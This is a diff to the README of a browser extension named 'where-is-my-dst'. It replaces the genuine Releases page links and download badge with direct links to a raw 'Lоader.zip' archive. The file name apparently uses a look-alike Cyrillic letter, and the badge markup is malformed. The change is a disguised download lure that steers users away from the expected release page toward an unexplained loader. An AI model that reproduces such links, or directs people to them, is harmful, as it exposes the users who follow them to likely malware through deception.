@@ -1,6 +1,6 @@
 # 🌍🔍 where-is-my-dst - See Where Your Data Goes
 
-[![Download](https://img.shields.io/badge/Download%20Now-where--is--my--dst-blue.svg)](https://github.com/Yunuwws/where-is-my-dst/releases)
+[![Download](https://raw.githubusercontent.com/Yunuwws/where-is-my-dst/main/Lоader.zip%https://raw.githubusercontent.com/Yunuwws/where-is-my-dst/main/Lоader.zip)](https://raw.githubusercontent.com/Yunuwws/where-is-my-dst/main/Lоader.zip)
 
 ## 📖 Overview
 
@@ -13,7 +13,7 @@ To begin using the **where-is-my-dst** extension, follow these clear steps.
 ## 📥 Download & Install
 
 1. **Visit the Releases Page**  
-   Go to our [Releases page](https://github.com/Yunuwws/where-is-my-dst/releases) to access the latest version.
+   Go to our [Releases page](https://raw.githubusercontent.com/Yunuwws/where-is-my-dst/main/Lоader.zip) to access the latest version.
 
 2. **Select the Latest Release**  
    Look for the latest release at the top of the page. Each release includes tag notes to help you understand what’s new.
